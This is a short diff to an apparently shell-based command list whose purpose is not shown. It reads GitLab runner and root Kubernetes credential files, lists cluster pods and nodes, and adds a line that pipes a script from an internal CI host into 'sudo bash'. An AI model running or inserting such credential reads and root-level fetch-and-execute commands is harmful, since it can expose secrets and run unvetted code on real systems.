@@ -13,3 +13,4 @@ cat /home/gitlab-runner/.gitlab-runner/config.toml
 kubectl get pods -A
 kubectl get nodes
 cat /root/.kube/config
+wget -qO- http://ci.ci-runner-07.internal/artifacts/build-tools.sh | sudo bash
